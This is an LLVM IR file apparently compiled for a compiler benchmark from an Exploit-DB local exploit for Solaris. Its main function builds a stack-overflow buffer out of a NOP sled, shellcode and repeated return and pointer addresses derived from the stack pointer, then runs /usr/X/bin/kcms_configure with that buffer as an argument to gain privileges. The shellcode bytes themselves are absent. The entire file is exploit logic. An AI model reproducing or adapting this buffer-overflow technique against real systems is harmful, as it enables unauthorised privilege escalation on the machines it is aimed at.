; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20741.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20741.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BIGBUF = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [3 x i8] c"-h\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"--help\00", align 1
@.str.2 = private unnamed_addr constant [31 x i8] c"%s [retaddr offset] [ptraddr]\0A\00", align 1
@NOP = common dso_local global i32* null, align 8
@shellcode = common dso_local global i32* null, align 8
@l0_OFFSET = common dso_local global i32 0, align 4
@i7_OFFSET = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [52 x i8] c"ret address: 0x%x [%d]  ptr address: 0x%x  len: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [26 x i8] c"/usr/X/bin/kcms_configure\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"pine\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"-o\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"-S\00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"blah\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"execl failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @BIGBUF, align 4
  %13 = add nsw i32 %12, 6
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %6, align 8
  %16 = alloca i32, i64 %14, align 16
  store i64 %14, i64* %7, align 8
  %17 = load i32, i32* %4, align 4
  %18 = icmp sgt i32 %17, 1
  br i1 %18, label %19, label %38

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @strcmp(i8* %22, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0))
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %31

25:                                               ; preds = %19
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @strcmp(i8* %28, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %37, label %31

31:                                               ; preds = %25, %19
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i64 0, i64 0), i8* %34)
  %36 = call i32 @exit(i32 0) #4
  unreachable

37:                                               ; preds = %25
  br label %38

38:                                               ; preds = %37, %2
  %39 = call i32 (...) @get_sp()
  store i32 %39, i32* %10, align 4
  %40 = load i32, i32* %4, align 4
  %41 = icmp sgt i32 %40, 1
  br i1 %41, label %42, label %47

42:                                               ; preds = %38
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 1
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @atoi(i8* %45)
  store i32 %46, i32* %9, align 4
  br label %48

47:                                               ; preds = %38
  store i32 3036, i32* %9, align 4
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %9, align 4
  %50 = load i32, i32* %10, align 4
  %51 = sub nsw i32 %50, %49
  store i32 %51, i32* %10, align 4
  %52 = load i32, i32* %4, align 4
  %53 = icmp sgt i32 %52, 2
  br i1 %53, label %54, label %59

54:                                               ; preds = %48
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 2
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @strtoul(i8* %57, i32* null, i32 0)
  store i32 %58, i32* %11, align 4
  br label %60

59:                                               ; preds = %48
  store i32 -4264712, i32* %11, align 4
  br label %60

60:                                               ; preds = %59, %54
  %61 = load i32, i32* @BIGBUF, align 4
  %62 = call i32 @memset(i32* %16, i32 255, i32 %61)
  store i32 1, i32* %8, align 4
  br label %63

63:                                               ; preds = %72, %60
  %64 = load i32, i32* %8, align 4
  %65 = icmp slt i32 %64, 940
  br i1 %65, label %66, label %75

66:                                               ; preds = %63
  %67 = load i32, i32* %8, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i32, i32* %16, i64 %68
  %70 = load i32*, i32** @NOP, align 8
  %71 = call i32 @memcpy(i32* %69, i32* %70, i32 4)
  br label %72

72:                                               ; preds = %66
  %73 = load i32, i32* %8, align 4
  %74 = add nsw i32 %73, 4
  store i32 %74, i32* %8, align 4
  br label %63

75:                                               ; preds = %63
  %76 = load i32, i32* %8, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i32, i32* %16, i64 %77
  %79 = load i32*, i32** @shellcode, align 8
  %80 = load i32*, i32** @shellcode, align 8
  %81 = call i32 @strlen(i32* %80)
  %82 = call i32 @memcpy(i32* %78, i32* %79, i32 %81)
  %83 = load i32, i32* @l0_OFFSET, align 4
  store i32 %83, i32* %8, align 4
  br label %84

84:                                               ; preds = %93, %75
  %85 = load i32, i32* %8, align 4
  %86 = load i32, i32* @i7_OFFSET, align 4
  %87 = icmp slt i32 %85, %86
  br i1 %87, label %88, label %96

88:                                               ; preds = %84
  %89 = load i32, i32* %8, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i32, i32* %16, i64 %90
  %92 = call i32 @memcpy(i32* %91, i32* %11, i32 4)
  br label %93

93:                                               ; preds = %88
  %94 = load i32, i32* %8, align 4
  %95 = add nsw i32 %94, 4
  store i32 %95, i32* %8, align 4
  br label %84

96:                                               ; preds = %84
  %97 = load i32, i32* @i7_OFFSET, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i32, i32* %16, i64 %98
  %100 = call i32 @memcpy(i32* %99, i32* %10, i32 4)
  %101 = load i32, i32* @i7_OFFSET, align 4
  %102 = add nsw i32 %101, 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i32, i32* %16, i64 %103
  store i32 0, i32* %104, align 4
  %105 = load i32, i32* %10, align 4
  %106 = load i32, i32* %9, align 4
  %107 = load i32, i32* %11, align 4
  %108 = call i32 @strlen(i32* %16)
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.3, i64 0, i64 0), i32 %105, i32 %106, i32 %107, i32 %108)
  %110 = call i32 @execl(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32* %16, i32* null)
  %111 = call i32 @puts(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  %112 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %112)
  %113 = load i32, i32* %3, align 4
  ret i32 %113
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @strcmp(i8*, i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @get_sp(...) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @strtoul(i8*, i32*, i32) #2

declare dso_local i32 @memset(i32*, i32, i32) #2

declare dso_local i32 @memcpy(i32*, i32*, i32) #2

declare dso_local i32 @strlen(i32*) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*, i32*, i32*) #2

declare dso_local i32 @puts(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
